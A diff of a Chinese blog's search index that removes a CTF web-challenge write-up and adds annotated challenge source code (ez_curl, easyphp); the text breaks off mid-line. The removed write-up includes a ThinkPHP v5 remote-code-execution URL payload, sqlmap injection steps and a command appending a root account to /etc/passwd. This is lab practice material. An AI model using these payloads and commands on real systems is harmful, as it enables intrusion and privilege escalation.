@@ -1,102 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CTF</title>
-    <url>/2022/08/15/web%E6%94%BB%E9%98%B2/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>实例</p>
-<span id="more"></span>
-<h2 id="第一题——baby-web"><a href="#第一题——baby-web" class="headerlink" title="第一题——baby_web"></a>第一题——baby_web</h2><p>掌握web相应包头部常见参数</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101339517.png" alt="题目"></p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101408887.png" alt="打开后的图片"></p>
-<p>根据题目描述考虑index.php页面，但是打开网页后直接跳转到了1.php，抓包得到</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101555331.png" alt></p>
-<p>扔到reperter模块，修改1.php为index.php</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101647686.png" alt></p>
-<p>看到旗帜被隐藏，看hex得到</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815101726805.png" alt></p>
-<p>或者通过开发者工具，在网络中可以看到index被重定向了<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815120359827.png" alt></p>
-<h2 id="第二题——ics-06"><a href="#第二题——ics-06" class="headerlink" title="第二题——ics-06"></a>第二题——ics-06</h2><p>id爆破</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103134706.png" alt="题目"></p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103201798.png" alt="靶场"></p>
-<p>点击很多个地方发现只有报表中心能点，里面内容为</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103310739.png" alt></p>
-<p>选了很多个日期发现没反应网页，后来发现改id是有反应的<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103352596.png" alt><br>明白了，爆破，先抓包再送去炸死这道阴间题<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103500026.png" alt></p>
-<p>然后我就一百个数一百个数进行爆破，在2300-2400的时候报文长度不一样了<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103556967.png" alt><br>看结果获得旗帜<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815103629272.png" alt></p>
-<h2 id="第三题——ingnt"><a href="#第三题——ingnt" class="headerlink" title="第三题——ingnt"></a>第三题——ingnt</h2><p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115158896.png" alt="题目"></p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115217584.png" alt="靶场"></p>
-<p>没有什么可操作的地方除了地址框，猜测是sql注入<br>方法1：直接采用万能钥匙<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115337825.png" alt></p>
-<p>方法二：sqlmap一把梭<br>先查数据库名<img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115419759.png" alt="image-20220815115419759"><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115447014.png" alt><br>查表名<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115506861.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115521175.png" alt><br>输出表中所有字段<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115600014.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115612711.png" alt><br>输出pw字段内容<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115639962.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115652969.png" alt><br>得到flag</p>
-<p>直接一把梭<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115726708.png" alt><br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20220815115746924.png" alt></p>
-<h2 id="第四题——cat-wife"><a href="#第四题——cat-wife" class="headerlink" title="第四题——cat_wife"></a>第四题——cat_wife</h2><p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702180603744.png" alt="image-20230702180603744"></p>
-<p>给出一个登陆界面，看到有注册，有url框，很容易会想到注入和爆破，但是题目要求说了不需要爆破，抓个包看看</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702180815052.png" alt="image-20230702180815052"></p>
-<p>很明显传递了两个参数username和password</p>
-<p>账户密码错误或为空会返回</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702181651762.png" alt="image-20230702181651762"></p>
-<p>检查注册页面</p>
-<p>成功注册</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702181924542.png" alt="image-20230702181924542"></p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182016261.png" alt="image-20230702182016261"></p>
-<p>注意到还有一个is admin选项</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182128449.png" alt="image-20230702182128449"></p>
-<p>会多出一个invite code选项，并且会前端检查是否填写</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182106478.png" alt="image-20230702182106478"></p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182211209.png" alt="image-20230702182211209"></p>
-<p>多两个参数，尝试更改参数，但是没有用。nmap进行端口扫描</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182532710.png" alt="image-20230702182532710"></p>
-<p>很多apache服务</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182553404.png" alt="image-20230702182553404"></p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182706094.png" alt="image-20230702182706094"></p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702182746936.png" alt="image-20230702182746936"></p>
-<p>经典漏洞远程执行</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702183653753.png" alt="image-20230702183653753"></p>
-<p>可能存在文件上传漏洞</p>
-<p>通过端口扫描得到两个可能存在漏洞的页面和一个php代码</p>
-<h2 id="thinkphp-v5"><a href="#thinkphp-v5" class="headerlink" title="thinkphp v5"></a>thinkphp v5</h2><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line">构造url：ip/index.php?s=index/think\app/invokefunction&amp;<span class="function"><span class="keyword">function</span>=<span class="title">call_user_func_array</span>&amp;<span class="title">vars</span><span class="params">[0]</span>=<span class="title">system</span>&amp;<span class="title">vars</span><span class="params">[1]</span><span class="params">[]</span>=<span class="params">[linux指令]</span></span></span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702183957488.png" alt="image-20230702183957488"></p>
-<p>得到我们是www-data用户</p>
-<p>nc尝试正向连接与反向连接均失败</p>
-<p>可以创建root权限用户，查看passwd表中书写格式</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702185059204.png" alt="image-20230702185059204"></p>
-<p>openssl生成用户并获得加密后的密码</p>
-<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">openssl</span> passwd -<span class="number">1</span> -salt<span class="meta"> [username] [password]</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702185209920.png" alt="image-20230702185209920"></p>
-<p>按照root格式写入passwd文件</p>
-<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">echo</span> <span class="string">&#x27;root:<span class="variable">$1</span><span class="variable">$akali</span><span class="variable">$CfWdWxRQ88</span>/m65buOdMLV0 <span class="variable">$1</span><span class="variable">$akali</span><span class="variable">$CfWdWxRQ88</span>/m65buOdMLV0:0:0:root:/root:/bin/bash&#x27;</span> &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure>
-<p>但是被拒绝</p>
-<p>查看系统版本</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702190107598.png" alt="image-20230702190107598"></p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702190136068.png" alt="image-20230702190136068"></p>
-<p>找一下有没有合适的exploit</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702191918573.png" alt="image-20230702191918573"></p>
-<p>但是发现无法写入文件也无法切换到tmp下</p>
-<p>尝试定时任务提权也发现并没有可写权限的文件</p>
-<p>目前通过www-data提权方式走不通</p>
-<p>ls看看当前能访问的文件</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702192713361.png" alt="image-20230702192713361"></p>
-<p>router.php<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702192807453.png" alt="image-20230702192807453"></p>
-<p>index.php<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702192902763.png" alt="image-20230702192902763"></p>
-<p>robots.txt<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702192934875.png" alt="image-20230702192934875"></p>
-<p>当前路径<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702193207392.png" alt="image-20230702193207392"></p>
-<p>没有找到特别有用的信息，看一下文件上传页面，上传正常图片<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702193401485.png" alt="image-20230702193401485"></p>
-<p>上传php图片时，而且是前端验证<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702193515809.png" alt="image-20230702193515809"></p>
-<p>尝试图片马<br><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702193639916.png" alt="image-20230702193639916"></p>
-<p>存在端口的影响，绝对路径也很难用御剑爆破出来</p>
-<p>wp查看源码，得到是一个原型链污染</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702200247737.png" alt="image-20230702200247737"></p>
-<p>就可以了</p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702200658611.png" alt="image-20230702200658611"></p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702200727563.png" alt="image-20230702200727563"></p>
-<h2 id="第五题——catcat"><a href="#第五题——catcat" class="headerlink" title="第五题——catcat"></a>第五题——catcat</h2><p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702200959138.png" alt="image-20230702200959138"></p>
-<p><img src="/2022/08/15/web%E6%94%BB%E9%98%B2/image-20230702201012248.png" alt="image-20230702201012248"></p>
-<p>可能存在任意文件读取漏洞</p>
-]]></content>
-      <categories>
-        <category>实例</category>
-      </categories>
-  </entry>
-  <entry>
     <title>函数库</title>
     <url>/2022/08/18/%E5%87%BD%E6%95%B0%E5%BA%93/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>学习过程中遇到的一些不认识的函数的学习积累</p>
@@ -753,6 +657,265 @@ d = R(2\frac{\rho _M}{\rho_m})^\frac{1}{3}</script><p><img src="/2023/02/21/%E7%
       </tags>
   </entry>
   <entry>
+    <title>代码审计</title>
+    <url>/2023/07/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>代码审计的学习</p>
+<span id="more"></span>
+<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="ez-curl"><a href="#ez-curl" class="headerlink" title="ez_curl"></a>ez_curl</h2><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="regexp">//</span>将当前php脚本的源代码输出到浏览器</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://back-end:3000/flag?&#x27;</span>;</span><br><span class="line"><span class="regexp">//</span>定义目标后端服务器的url，该服务监听在http:<span class="regexp">//</span>back-end:<span class="number">3000</span>/flag</span><br><span class="line"><span class="variable">$input</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="regexp">//</span>获取HTTP请求的原始内容，并将其保存在<span class="variable">$input</span>中</span><br><span class="line"><span class="regexp">//</span>php:<span class="regexp">//i</span>nput 是 PHP 中的特殊输入流，用于访问原始的请求体数据，不管请求的 HTTP 方法是什么（GET、POST、PUT 等）</span><br><span class="line"><span class="variable">$headers</span> = (array)json_decode(<span class="variable">$input</span>)-&gt;headers;</span><br><span class="line"><span class="regexp">//</span>从 HTTP 请求原始内容中解析出请求头，并将其保存在 <span class="variable">$headers</span> 数组中。</span><br><span class="line"><span class="regexp">//</span>请求体中的数据应该是一个 JSON 对象，其中包含两个属性：headers 和 params。headers 是一个数组，包含多个字符串，每个字符串都是一个请求头</span><br><span class="line">/***</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;headers&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;Host: example.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;User-Agent: Mozilla/5.0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Content-Type: application/json&quot;</span>,</span><br><span class="line">    ...</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;params&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;key1&quot;</span>: <span class="string">&quot;value1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;key2&quot;</span>: <span class="string">&quot;value2&quot;</span>,</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">***/</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; count(<span class="variable">$headers</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$offset</span> = stripos(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="regexp">//</span>使用 stripos() 函数查找请求头中第一个冒号 : 的位置，并将其赋值给 <span class="variable">$offset</span> 变量。</span><br><span class="line">    <span class="variable">$key</span> = substr(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="number">0</span>, <span class="variable">$offset</span>);</span><br><span class="line">    <span class="regexp">//</span>使用 substr() 函数从请求头中截取从索引 <span class="number">0</span> 到 <span class="variable">$offset</span> - <span class="number">1</span> 的字符，也就是冒号之前的部分，并将其赋值给 <span class="variable">$key</span> 变量。</span><br><span class="line">    <span class="variable">$value</span> = substr(<span class="variable">$headers</span>[<span class="variable">$i</span>], <span class="variable">$offset</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="regexp">//</span>使用 substr() 函数从请求头中截取从 <span class="variable">$offset</span> + <span class="number">1</span> 到末尾的字符，也就是冒号之后的部分，并将其赋值给 <span class="variable">$value</span> 变量。</span><br><span class="line">    <span class="regexp">//</span>如果请求头中的内容是 <span class="string">&quot;Content-Type: application/json&quot;</span>，则 <span class="variable">$key</span> 变量将存储 <span class="string">&quot;Content-Type&quot;</span>，而 <span class="variable">$value</span> 变量将存储 <span class="string">&quot;application/json&quot;</span>。</span><br><span class="line">    <span class="keyword">if</span>(stripos(<span class="variable">$key</span>, <span class="string">&#x27;admin&#x27;</span>) &gt; -<span class="number">1</span> &amp;&amp; stripos(<span class="variable">$value</span>, <span class="string">&#x27;true&#x27;</span>) &gt; -<span class="number">1</span>)&#123;</span><br><span class="line">        die(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="regexp">//</span>三元判断，判断是否存在包含 <span class="string">&quot;admin&quot;</span> 字符的请求头，并且对应的值为 <span class="string">&quot;true&quot;</span>。如果满足条件，脚本将输出 <span class="string">&quot;try hard&quot;</span> 并终止。</span><br><span class="line">&#125;</span><br><span class="line"><span class="regexp">//</span>循环遍历所有请求头</span><br><span class="line"><span class="variable">$params</span> = (array)json_decode(<span class="variable">$input</span>)-&gt;params;</span><br><span class="line"><span class="regexp">//</span>从 HTTP 请求原始内容中解析出请求参数，并将其保存在 <span class="variable">$params</span> 数组中。</span><br><span class="line"><span class="variable">$url</span> .= http_build_query(<span class="variable">$params</span>);</span><br><span class="line"><span class="regexp">//</span>将请求参数拼接到 URL 后面。</span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&#x27;&amp;admin=false&#x27;</span>;</span><br><span class="line">在 URL 后面添加一个名为 <span class="string">&quot;admin&quot;</span> 的参数，并将其值设为 <span class="string">&quot;false&quot;</span>。</span><br><span class="line"><span class="variable">$ch</span> = curl_init();</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line"><span class="regexp">//</span>设置 cURL 请求的目标 URL，即要发送请求的地址。</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line"><span class="regexp">//</span>设置 cURL 请求的头部信息，将之前从请求体中解析得到的请求头数据（保存在 <span class="variable">$headers</span> 数组中）添加到 HTTP 请求中。</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_TIMEOUT_MS, <span class="number">5000</span>);</span><br><span class="line"><span class="regexp">//</span>设置 cURL 请求的超时时间，这里设置为 <span class="number">5000</span> 毫秒，即 <span class="number">5</span> 秒。</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_NOBODY, FALSE);</span><br><span class="line"><span class="regexp">//</span>设置 cURL 请求是否要获取 HTTP 响应的主体部分。这里设置为 FALSE，表示请求会获取完整的响应内容，包括响应头和响应主体。</span><br><span class="line"><span class="variable">$result</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line"><span class="regexp">//</span>执行 CURL 请求，并将结果保存在 <span class="variable">$result</span> 变量中。</span><br><span class="line">curl_close(<span class="variable">$ch</span>);</span><br><span class="line"><span class="regexp">//</span>关闭 CURL会话。</span><br><span class="line">echo <span class="variable">$result</span>;</span><br><span class="line"><span class="regexp">//</span> CURL 请求的结果输出到浏览器。</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">//引入 Express 框架，将其赋值给变量 express。</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="comment">//创建一个 Express 应用程序实例，将其赋值给变量 app。</span></span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">flag</span>;</span><br><span class="line"><span class="comment">//从环境变量中获取名为 flag 的值，并将其赋值给变量 flag。这个环境变量可能在运行时通过设置来提供。</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/flag&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(!req.<span class="property">query</span>.<span class="property">admin</span>.<span class="title function_">includes</span>(<span class="string">&#x27;false&#x27;</span>) &amp;&amp; req.<span class="property">headers</span>.<span class="property">admin</span>.<span class="title function_">includes</span>(<span class="string">&#x27;true&#x27;</span>))&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;try hard&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(&#123; <span class="attr">port</span>: port , <span class="attr">host</span>: <span class="string">&#x27;0.0.0.0&#x27;</span>&#125;);</span><br></pre></td></tr></table></figure>
+<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">    <span class="comment">//检查 &quot;b&quot; 是否存在，并且 &quot;b&quot; 经过 MD5 哈希后的后六位是否等于 &quot;8b184b&quot;。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查 &quot;a&quot; 是否存在且转换为整数后大于 6000000，并且字符串长度不超过 3。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="comment">//从 GET 请求的参数中获取 &quot;c&quot; 的值，并将其转换为数组。@ 符号用于抑制错误提示，以防止解析失败。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]);</span><br><span class="line">        <span class="variable">$d</span> === <span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">            <span class="variable">$val</span>===<span class="string">&quot;DGGJ&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;no...&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$key2</span> = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//检查 &quot;c&quot; 中的 &quot;n&quot; 是否是数组，并且数组长度为 2，并且数组的第一个元素也是数组。</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查 &quot;c&quot; 是否是数组，并且其中的 &quot;m&quot; 不是数字，并且其值大于 2022。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key1</span> &amp;&amp; <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;Hgfks.php&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You&#x27;re right&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>easyphp</title>
+    <url>/2023/07/27/easyphp/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>知识点：科学计数法，php松散类型</p>
+<span id="more"></span>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...再想想&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">    <span class="comment">//检查 &quot;b&quot; 是否存在，并且 &quot;b&quot; 经过 MD5 哈希后的后六位是否等于 &quot;8b184b&quot;。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检查 &quot;a&quot; 是否存在且转换为整数后大于 6000000，并且字符串长度不超过 3。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span class="comment">//从 GET 请求的参数中获取 &quot;c&quot; 的值，并将其转换为数组。@ 符号用于抑制错误提示，以防止解析失败。</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(@<span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>]) &amp;&amp; <span class="variable">$c</span>[<span class="string">&quot;m&quot;</span>] &gt; <span class="number">2022</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(@<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">count</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>]) == <span class="number">2</span> &amp;&amp; <span class="title function_ invoke__">is_array</span>(<span class="variable">$c</span>[<span class="string">&quot;n&quot;</span>][<span class="number">0</span>]))&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">array_search</span>(<span class="string">&quot;DGGJ&quot;</span>, <span class="variable">$c</span>[<span 